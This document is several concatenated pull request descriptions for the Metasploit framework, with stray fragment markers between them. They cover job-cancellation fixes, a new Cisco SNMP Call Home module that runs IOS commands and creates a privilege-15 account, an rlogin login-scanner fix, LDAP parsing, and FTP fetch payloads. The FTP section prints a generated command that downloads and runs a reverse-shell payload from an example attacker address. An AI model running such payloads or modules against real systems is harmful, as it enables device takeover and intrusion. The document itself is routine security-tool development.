Keep callbacks outside the state mutex. Record stop requests before worker admission, let workers publish and withdraw their own handles, and protect the active cleanup owner. If a running worker's cleanup requests its own stop, cancellation is deferred until the callback finishes. Concurrent callers return without waiting for an existing cleanup owner; job removal is not a cleanup-completion barrier.

Suppressing execution before worker admission also requires a terminal RPC result. Module cleanup now asks listeners that support `cancelled_before_start` to finalize a still-waiting run. The RPC tracker stores an acknowledgeable error only while queued. Recording any terminal result removes both waiting and running state, preventing later cleanup from overwriting or recreating an earlier failure. Existing listeners without the optional hook remain usable; no RPC status values or user options are added.

## Setup and reproduction

Tested locally on Ubuntu/WSL with CRuby 3.2.3, 3.3.13, and 3.4.4. Console tests used loopback listeners without a database or live sessions.

The cleanup regression has this observed result in real msfconsole:

```text
upstream: cleanup_calls=0 listener_closed=false
patched:  cleanup_calls=1 listener_closed=true
```

The queued-cancellation regression stops a job after registration but before the thread factory returns. The run procedure must not execute, the UUID must leave `waiting`, and `module.results` must return an acknowledgeable error. Without the listener update, the stopped job disappears from `job.list`, but its UUID remains `ready` and `module.ack` returns false. The new spec exercises this ordering with queue barriers.

## Verification

- [x] 102 focused examples pass on CRuby 3.2.3: Job lifecycle, RPC tracking, module run/check tracking, and the new cancellation cases. These cover cleanup errors, previous result preservation, acknowledgement, and listeners without the optional hook.
- [x] 100 early cancellations through authenticated MessagePack RPC execution and console stopping: all fixed results were `errored`, all acknowledgements succeeded, and no waiting UUIDs remained. The Job-only control (`492ace2`) retained 100 waiting UUIDs. A normal run still completed and was acknowledged.
- [x] 9,000 tracker concurrency scenarios pass across CRuby 3.2.3, 3.3.13, and 3.4.4 with ActiveSupport 8.0.5, covering simultaneous cancellation, normal completion, and acknowledged failures.
- [x] Real msfconsole on 3.2.3 passes the 15 handler, shared HTTP listener, RPC, cleanup, and admission checks after the follow-up.
- [x] The original Job synchronization file is unchanged by the follow-up. Its earlier validation includes 54,000 controlled concurrency scenarios across those three runtimes.
- [x] No new RuboCop offenses; both new spec files have zero offenses. Whitespace checks pass.

For the focused suite in a normally configured test environment:

```sh
bundle exec rspec spec/lib/rex/job_spec.rb spec/lib/msf/core/rpc/v10/rpc_queued_job_cancellation_spec.rb spec/lib/msf/core/rpc/v10/rpc_job_status_tracker_spec.rb spec/lib/msf/base/simple/auxiliary_job_tracking_spec.rb spec/lib/msf/base/simple/post_job_tracking_spec.rb spec/lib/msf/base/simple/exploit_job_tracking_spec.rb spec/lib/msf/base/simple/evasion_job_tracking_spec.rb --seed 42146
```

## Limits

Hosted CI for `d77c72b`: all 14 Verify jobs, Lint, and Build Docs passed. The Ruby 3.2–3.4 non-content jobs each ran 16,220 examples with zero failures and 33 pending, including both new spec files. Meterpreter Acceptance has 22 successful jobs, one optional skip, and one cancelled macOS mettle job. That job logged network-interface failures before reaching its 60-minute limit. The same assertions fail on later upstream master, but the timeout has not been isolated. A targeted rerun was denied with HTTP 403; this remains a verification blocker and the PR is draft.

One earlier ephemeral-port rebind probe returned `EADDRINUSE` after the socket-closed check passed; its cause was not captured. Final resource probes used dedicated ports below the ephemeral range.

Native Windows/macOS, live sessions, and full console execution on Ruby 3.3/3.4 were not tested locally. Direct forced interruption, failing or permanently blocked callbacks, and cancellation of a worker executing a different job's cleanup retain existing limitations. The last case reproduces on both upstream and this patch. Running-job RPC cancellation behavior and custom listeners that do not implement the optional hook are not expanded by the queued-cancellation fix.

Adds auxiliary/admin/networking/cisco_snmp_callhome_cli_exec and corresponding module documentation.

The module uses valid SNMP write access to CISCO-CALLHOME-MIB to execute IOS CLI commands through Call Home’s on-demand command interface. It receives command output through a temporary SMTP-server row, displays the output, and saves it as loot.

Two actions are supported:

- EXECUTE: runs a semicolon-delimited IOS CLI command list.
- CREATE_ACCOUNT: creates a local IOS account with privilege level 15.

Testing observed privilege level 15 execution with Call Home AAA authorization disabled, including when global Call Home was disabled. Command authority when Call Home AAA authorization is enabled requires separate validation.

The module produces IOS CLI output and does not establish a Metasploit session.

### Dependency

SNMPv3 support depends on the shared SNMP framework changes in #22035, including the SNMPV3::... datastore options. SNMPv3 testing was performed with those changes applied.

Reviewers testing SNMPv3 must include that dependency until #22035 is merged.

### Breaking changes

None to existing modules.

## Setup and Reproduction

### Test environment and software coverage

| Component | Details |
|---|---|
| Target | Cisco C8000V |
| IOS XE 17.9.6 | Metasploit module execution, SMTP output collection, account creation, and cleanup validated |
| IOS XE 17.6.5 | Underlying Call Home CLI execution path previously validated |
| SNMP | SNMPv2c and SNMPv3 authPriv |
| SNMPv3 configuration tested | SHA-1 authentication and AES-128 privacy |
| Call Home AAA authorization | Disabled |
| Output transport | Target-initiated SMTP connection to Metasploit on TCP/25 |

A complete affected-version range and fixed release have not been established. The module detects live MIB objects rather than relying on a version or model match. Other releases and hardware platforms require validation.

### Prerequisites

- SNMP read/write access to the required CISCO-CALLHOME-MIB objects.
- Read access to SNMPv2-MIB::sysDescr.0.
- An available on-demand Call Home service.
- Target connectivity to the Metasploit receiver on TCP/25.
- Permission for Metasploit to bind TCP/25.
- A device-reachable IPv4 address configured as LHOST.

The receiver and temporary SMTP row use fixed TCP/25. SRVHOST controls the local bind address; LHOST is the address advertised to the device.

Lab configuration instructions are included in:

documentation/modules/auxiliary/admin/networking/cisco_snmp_callhome_cli_exec.md

## Verification

   - [ ] Load the module and configure SNMPv2c:

   use auxiliary/admin/networking/cisco_snmp_callhome_cli_exec

set VERSION 2c

### Operational considerations and remaining coverage

- check performs temporary SNMP writes and opens the SMTP listener, without triggering CLI execution.
- Cleanup restores captured Call Home controls and removes the module-created SMTP row. It does not reverse changes made by submitted CLI commands.
- CREATE_ACCOUNT leaves the account in running configuration. The module does not save it to startup configuration.
- Existing SMTP rows are refused by default because they could receive command text and output. The selected callback row is never overwritten.
- Command lists are limited to 127 bytes. Commands requiring interactive input can leave the serialized Call Home service busy.
- A callback timeout does not establish whether the commands executed; inspect target state before repeating configuration-changing commands.
- SNMPv1, other hardware platforms, and command authorization with Call Home AAA enabled remain unvalidated.

32:Tfba,## Description

`rlogin_login` stops after the first wrong password:

```
[*] 127.0.0.1:513         - 127.0.0.1:513 rlogin - Attempting: 'bob':"wrong2" from 'root'
[-] 127.0.0.1:513         - Unable to connect: The destination is invalid: (127.0.0.1:513).
```

`Msf::Auxiliary::RServices#connect_from_privileged_port` tries source ports from 1023 down and skips a port on `Rex::BindFailed`. Each attempt starts again at 1023. When the previous connection from 1023 to the target is still closing, the bind succeeds, but `connect()` fails with `EADDRNOTAVAIL`, because that exact connection still exists. Rex raises this as `Rex::InvalidDestination`, a subclass of `Rex::ConnectionError`, so the method returns `:connection_error` and the scan stops.

Running `ss` from msfconsole right after the failure shows the old connection still in place:

```
State      Recv-Q Send-Q Local Address:Port Peer Address:Port
LISTEN     0      128        127.0.0.1:513       0.0.0.0:*
FIN-WAIT-1 0      1          127.0.0.1:1023    127.0.0.1:513
CLOSE-WAIT 2      0          127.0.0.1:513     127.0.0.1:1023
```

rlogind's `login` process doesn't close its side immediately after a wrong password, so any rlogin server should hit this whenever more than one password is tried.

This PR treats `Rex::InvalidDestination` the same way as `Rex::BindFailed`: it tries the next port. Real connection failures, such as refused or unreachable, still end the attempt as before.

Independent of #22076, which removes the duplicate prefixes in the same modules and touches a different part of `rservices.rb`.

AI tools: Claude Code helped with the investigation. I ran the console sessions below myself.

Same target as #22076: `rsh-redone-server` under inetd in Debian bookworm, host networking, bound to `127.0.0.1`. User `bob` has password `password` and no `.rhosts`. `PASS_FILE` contains `wrong`, `wrong2`, `password`. `net.ipv4.ip_unprivileged_port_start` is 0, so msfconsole can bind ports below 1024 without root.

33:T908,## Description

Addresses the Windows LDAP portion of #17683. The remote LDAP client already accepts lowercase domain-component attributes, but the Windows helper still recognizes only literal `DC=`.

For `dc=example,dc=com`, `dn_to_domain` returns the original DN instead of `example.com`, and `query` incorrectly treats the supplied DN as a DNS domain requiring naming-context discovery. Accept domain-component attributes regardless of case in both paths. Preserve the original DN for the search base and preserve the casing of component values.

Reuse the existing `Net::LDAP::DN` parser to select actual `DC` attributes, ignoring `dc=` text within attribute values and respecting escaped commas. Inputs without domain components or valid DN syntax retain the existing domain-lookup behavior.

Add 17 regression examples covering uppercase/lowercase/mixed-case attributes, OU-prefixed DNs, embedded `dc=` text, escaped commas, ordinary DNS names, datastore input, and search-base selection. No API or dependency changes.

37:Tb15,## Description

Fixes #22032

Documentation is stored under the singular module type (`documentation/modules/exploit/`), which is what `Msf::Module#fullname` and `info -d` look up. Two things disagreed with that: one doc had been added under `documentation/modules/exploits/`, and `msftidy_docs` accepted either spelling for exploits while expecting `payloads/` for payload docs (a directory that doesn't exist).

- `msftidy_docs` now errors on docs under `exploits/`, `payloads/`, `encoders/` and `nops/`, and names the correct directory.
- Replaces the one-off `exploit` -> `exploits` substitution with an explicit doc-type -> module-dir table.
- Payload docs are now resolved to singles or stage/stager pairs, so `documentation/modules/payload/` passes `has_module`. Before this, all 15 payload docs failed it.
- `info -d` needs no change, since it already builds its path from `mod.fullname`.

Related: #21929 adds a CI job that runs `msftidy_docs` on newly added docs, which would have failed any new payload doc without this fix.

rubocop reports pre-existing offenses elsewhere in `tools/dev/msftidy_docs.rb`; I left them untouched to keep this diff focused.

- Not tested: edited docs, and the new CI job itself (not yet merged).38:Ta1b,## Description

FTP fetch payloads on Linux (`payload/cmd/linux/ftp/*`) fail at generation with `BadConfig: Unsupported Binary Selected` on default options.

Root cause: `FETCH_COMMAND` defaults to `CURL`, set by the shared `LinuxOptions`/`WindowsOptions` mixins rather than by `Fetch::FTP` itself. `CURL` works for HTTP/HTTPS/TFTP adapters but `_generate_curl_command` has no `FTP` case, so every Linux FTP adapter (all 12 architectures) fails unless the operator manually sets `FETCH_COMMAND=FTP`.

The 3 Windows FTP adapters avoid this today only because each one duplicates a local `FETCH_COMMAND` override. That duplication exists because of include order: `LinuxOptions`/`WindowsOptions` is included *after* `Fetch::FTP` in every adapter, so it runs later during `initialize` and would clobber any override placed in the `Fetch::FTP` mixin itself.

## Fix

- Move the `FETCH_COMMAND` override into `Fetch::FTP#initialize`.
- Swap include order in every FTP leaf module (Linux + Windows) so the platform-options mixin runs before `Fetch::FTP`, letting its override stick.
- Remove the now-redundant duplicated override from the 3 Windows adapters.

One shared implementation instead of duplicated logic; fixes all current and future FTP adapters.

## Breaking Changes

None. Windows FTP behavior unchanged (verified below). Linux FTP adapters now work out of the box instead of requiring a manual `FETCH_COMMAND=FTP`.

## Verification Steps

msf6 payload(cmd/linux/ftp/x64/shell_reverse_tcp) > show options
FETCH_COMMAND FTP yes Command to fetch payload (Accepted: FTP)

$ msfvenom -p cmd/linux/ftp/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=4444
Payload size: 98 bytes
ftp -Vo ./evmYenoGY ftp://192.0.2.10:8080/4gANU5lgM9HsFqQtQxF5wQ;chmod +x ./evmYenoGY;./evmYenoGY&

Previously failed with `Error: bad-config: Unsupported Binary Selected`.

msf6 payload(cmd/windows/ftp/x64/shell_reverse_tcp) > show options

$ msfvenom -p cmd/windows/ftp/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=4444 FETCH_SRVPORT=21

Confirms Windows behavior is unchanged.
